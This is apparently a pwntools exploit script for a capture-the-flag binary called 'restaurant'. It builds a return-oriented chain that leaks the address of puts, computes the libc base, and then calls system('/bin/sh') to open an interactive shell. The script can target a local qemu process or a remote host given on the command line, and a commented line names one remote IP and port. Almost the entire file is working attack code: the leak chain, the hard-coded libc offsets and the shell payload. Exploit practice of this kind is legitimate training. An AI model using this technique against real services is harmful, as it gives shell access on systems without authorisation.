#!/usr/bin/python2

import sys
import os
import re
import struct
from pwn import *
import argparse

##use python2 not python3 for ease of generating strings for payloads 

################################################################################################################
#           Building Payload for Exploit
#
#
################################################################################################################


exe="./restaurant"

elf=context.binary=ELF(exe, checksec=False)
context.log_level="debug"
def exploit_init():
    pop_rdi=0x4010a3

    pprint(elf.got)
    final_payload=flat(
            {8:[
                pop_rdi,
                elf.got.puts,
                elf.plt.puts,
                elf.symbols.main
             ]}
    )

    print("final_payload", final_payload)
    target=q_start()

    initial_payload=b'1'
    target.recv()
    target.sendlineafter("2. Drink something\x0a> ", initial_payload)
    #target.sendline(initial_payload)
    #target.wait()

    #target.sendlineafter("You can add these ingredients to your dish:", final_payload)
    target.sendlineafter("> ", final_payload)
    ret_adr=target.recv()
    #got_puts_adr = unpack(ret_adr[:6].ljust(8, b"\x00"))
    got_puts_adr = unpack(ret_adr.ljust(8, b"\x00"))
    info("got_puts_adr: %#x :", got_puts_adr)
    ##target.interactive()

    ##offset of puts within stdc lib
    ##0x80aa0
    ##base address of libc = got_puts_adr - offset_puts_within_libc
    base_adr_libc=got_puts_adr-0x80aa0
    ##info("base_adr_libc: %#x :", base_adr_libc)
    ##offset of system within stdc lib
    #000000000004f550
    adr_system = base_adr_libc + 0x4f550
    info("adr_system: %#x :", adr_system)

    bin_sh_offset=0x1b3e1a 
    bin_sh_adr=base_adr_libc + bin_sh_offset
    info("bin_sh_adr: %#x :", bin_sh_adr)
    second_payload=flat(
            {996:[
                pop_rdi,
                bin_sh_adr,
                adr_system
             ]}
    )
    
    target.send(second_payload)
    target.interactive()






################################################################################################################
#           Testing Exploit
#           Command line args used to switch between testing locally with qemu + testing remotely
#
################################################################################################################
x86_64_qemu_args=["qemu-x86_64", "-L", "/usr/x86_64-linux-gnu/"]

def q_start(argv=[], *a , **kwargs):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process(x86_64_qemu_args +[exe], *a, **kwargs)


##remote exploit
#target=process("nc")
##target=remote("167.99.207.150", 30511)

##have to use sendline() not send() so that the trailing \n is appended to the bytes payload
##target.sendline(final_payload)
##def exploit():
#    target=q_start()

#    initial_payload=b'1'
#    target.recv()
#    target.sendlineafter("2. Drink something\x0a> ", initial_payload)

#    target.sendlineafter("> ", final_payload)
#    ret_adr=target.recv()
#    got_puts_adr = unpack(ret_adr[:6].ljust(8, b"\x00"))
#    info("got_puts_adr: %#x :", got_puts_adr)

    ##offset of puts within stdc lib
    ##0x80aa0
    ##base address of libc = got_puts_adr - offset_puts_within_libc
##    base_adr_libc=got_puts_adr-0x80aa0
##    info("base_adr_libc: %#x :", base_adr_libc)
    ##offset of system within stdc lib
    #000000000004f550
##    adr_system = base_adr_libc + 0x4f550
##    info("adr_system: %#x :", adr_system)

##    bin_sh_offset=0x1b3e1a 
##    bin_sh_adr=base_adr_libc + bin_sh_offset
##    info("bin_sh_adr: %#x :", bin_sh_adr)

#    second_payload=flat(
#            {1024:[
#                pop_rdi,
#                bin_sh_adr,
#                adr_system
#             ]}
#    )
    
#    target.send(second_payload)
#    target.interactive()

    #print("second_payload", second_payload)




    ##yy"You can add these ingredients to your dish:",
    #🍅
    ##\xf0\x9f\x8d\x85
    ##1. 🍅
    ##\xf0\x9f\x8d\x85
    #2. 🧀
    ##\xf0\x9f\xa7\x80
    ##You can also order something else.


    ##offset of puts within stdc lib
    ##0x80aa0
    ##base address of libc = got_puts_adr - offset_puts_within_libc
    ##base_adr_libc=got_puts_adr-0x80aa0
    ##info("base_adr_libc: %#x :", base_adr_libc)
    ##offset of system within stdc lib
    #000000000004f550
    ##adr_system = base_adr_libc + 0x4f550
    ##info("adr_system: %#x :", adr_system)

    ##bin_sh_offset=0x1b3e1a 
    ##bin_sh_adr=base_adr_libc + bin_sh_offset
    ##info("bin_sh_adr: %#x :", bin_sh_adr)


    #0x00400ec5 void *buf

################################################################################################################
#           Argparse template - more detailed/fine-grained command line controls
#
################################################################################################################

#def setup_options():
#    parser = argparse.ArgumentParser(description='Generate exploits for programs vulnerable to memory corruption vulnerabilities; includes functions for identifying/calculating address offset and padding, creating payloads and employing various common mitigation bypass techniques.')
#    parser.add_argument('-gdb', nargs='?', type=bool, default=False,  help='Run the program with gdb for debugging')
#    #parser.add_argument('--remote', help='Send the exploit to the remote target at [IP] [PORT]')
#    subparsers = parser.add_subparsers()
#    remote_subparser= subparsers.add_parser('remote', help='Send the exploit to the remote target at [IP] [PORT]')
#    remote_subparser.add_argument('IP', type=str,  help='IP Address of remote target')
#    remote_subparser.add_argument('PORT', type=int,  help='Port of remote target')
#    #subparsers = parser.add_subparsers()
#    #parser.add_argument('-write-payloads', action="store_true",  help='Option to retrieve file or files from generated list of all files on target device')
#    #parser.add_argument('-IP', type=int,  help='IP Address of remote target')
#    #parser.add_argument('-PORT', type=int,  help='Port of remote target')
#    args = parser.parse_args()
#    #remote_args = remote_subparser.parse_args()
#    return parser, args

#def exploit_preamble(parser, args):
#    r=args.remote
#    #payload_num=int(args.payloads)
#    #payload_data = '{"command":' + cmd + '}'
#    print("args:", args)
#    print("remote:", r)

################################################################################################################
#
################################################################################################################

if __name__ == '__main__':
    exploit_init()
    
